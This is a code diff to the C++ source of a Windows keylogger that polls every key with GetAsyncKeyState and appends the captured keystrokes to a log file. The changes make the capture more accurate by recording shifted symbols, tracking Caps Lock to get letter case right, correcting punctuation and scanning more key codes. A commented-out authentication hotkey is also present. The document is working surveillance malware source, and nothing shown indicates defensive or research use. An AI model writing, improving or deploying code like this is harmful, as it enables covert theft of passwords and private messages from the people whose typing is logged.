@@ -34,6 +34,7 @@
 using namespace std;
 
 bool numUnlocked = true;
+int capsCount=0;
 
 void viewOptions();
 bool authentication_ret(char*, char*);
@@ -1017,14 +1018,47 @@ int save(int _key, char const *file)
     Sleep(10);
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen (file,"a+");
-    if((_key>=39)&&(_key<=64))
+    if((_key>=48)&&(_key<=57))
     {
-        fputc(_key,OUTPUT_FILE);
+        if(GetAsyncKeyState(VK_SHIFT))
+        {
+
+            if(_key==48)
+                fputc(')',OUTPUT_FILE);
+            if(_key==49)
+                fputc('!',OUTPUT_FILE);
+            if(_key==50)
+                fputc('@',OUTPUT_FILE);
+            if(_key==51)
+                fputc('#',OUTPUT_FILE);
+            if(_key==52)
+                fputc('$',OUTPUT_FILE);
+            if(_key==53)
+                fputc('%',OUTPUT_FILE);
+            if(_key==54)
+                fputc('^',OUTPUT_FILE);
+            if(_key==55)
+                fputc('&',OUTPUT_FILE);
+            if(_key==56)
+                fputc('*',OUTPUT_FILE);
+            if(_key==57)
+                fputc('(',OUTPUT_FILE);
+
+        }
+        else
+            fputc(_key,OUTPUT_FILE);
     }
     else if((_key>64)&&(_key<91))
     {
-        _key+=32;
-        fputc(_key,OUTPUT_FILE);
+        if(!((GetAsyncKeyState(VK_SHIFT)&0x8000)^(capsCount%2==1)))
+        {
+            cout<< capsCount%2<<endl;
+            _key+=32;
+            fputc(_key,OUTPUT_FILE);
+        }
+        else
+            fputc(_key,OUTPUT_FILE);
+
     }
     else if( _key == VK_SPACE)
         fprintf(OUTPUT_FILE, "%s", " ");
@@ -1041,7 +1075,11 @@ int save(int _key, char const *file)
     else if( _key == VK_RBUTTON)
         fprintf(OUTPUT_FILE, "%s", "\n[RBUTTON]\n");
     else if( _key == VK_CAPITAL)
+    {
         fprintf(OUTPUT_FILE, "%s", "\n[CAPSLOCK]\n");
+        capsCount++;
+        printf("caps: %d",capsCount);
+    }
     else if( _key == VK_TAB)
         fprintf(OUTPUT_FILE, "%s", "\n[TAB]\n");
     else if( _key == VK_UP)
@@ -1071,36 +1109,36 @@ int save(int _key, char const *file)
 
     else if( _key == VK_OEM_3)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", "~");
         else
             fprintf(OUTPUT_FILE, "%s", "`");
     }
     else if( _key == VK_OEM_4)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", "{");
         else
             fprintf(OUTPUT_FILE, "%s", "[");
     }
     else if( _key == VK_OEM_5)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", "|");
         else
             fprintf(OUTPUT_FILE, "%s", "\\");
     }
     else if( _key == VK_OEM_6)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
+        if(GetAsyncKeyState(VK_SHIFT))
             fprintf(OUTPUT_FILE, "%s", "}");
         else
             fprintf(OUTPUT_FILE, "%s", "]");
     }
     else if( _key == VK_OEM_7)
     {
-        if(GetAsyncKeyState(VK_SHIFT) && 0x8000)
-            fprintf(OUTPUT_FILE, "%s", "\\");
+        if(GetAsyncKeyState(VK_SHIFT))
+            fprintf(OUTPUT_FILE, "%s", "\"");
         else
             fprintf(OUTPUT_FILE, "%s", "'");
     }
@@ -1163,36 +1201,55 @@ int save(int _key, char const *file)
 
 
     else if( _key == VK_NUMPAD0)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "0");
+    }
     else if( _key == VK_NUMPAD1)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "1");
+    }
     else if( _key == VK_NUMPAD2)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "2");
+    }
     else if( _key == VK_NUMPAD3)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "3");
+    }
     else if( _key == VK_NUMPAD4)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "4");
+    }
     else if( _key == VK_NUMPAD5)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "5");
+    }
     else if( _key == VK_NUMPAD6)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "6");
+    }
     else if( _key == VK_NUMPAD7)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "7");
+    }
     else if( _key == VK_NUMPAD8)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "8");
+    }
     else if( _key == VK_NUMPAD9)
+    {
         if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "9");
-
+    }
     else if( _key == VK_F1)
         fprintf(OUTPUT_FILE, "%s", "\n[F1]\n");
     else if( _key == VK_F2)
@@ -1217,8 +1274,6 @@ int save(int _key, char const *file)
         fprintf(OUTPUT_FILE, "%s", "\n[F11]\n");
     else if( _key == VK_F12)
         fprintf(OUTPUT_FILE, "%s", "\n[F12]\n");
-    else if( _key == VK_SHIFT)
-        fprintf(OUTPUT_FILE, "%s", "\n[SHIFT]\n");
     else if( _key == VK_SCROLL)
         fprintf(OUTPUT_FILE, "%s", "\n[SCROLL]\n");
     else if( _key == VK_END)
@@ -1251,7 +1306,7 @@ int main()
     while(1)
     {
         Sleep(10);
-        for(i=0;i<222;i++)
+        for(i=0;i<255;i++)
         {
             //if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
                    // authentication();
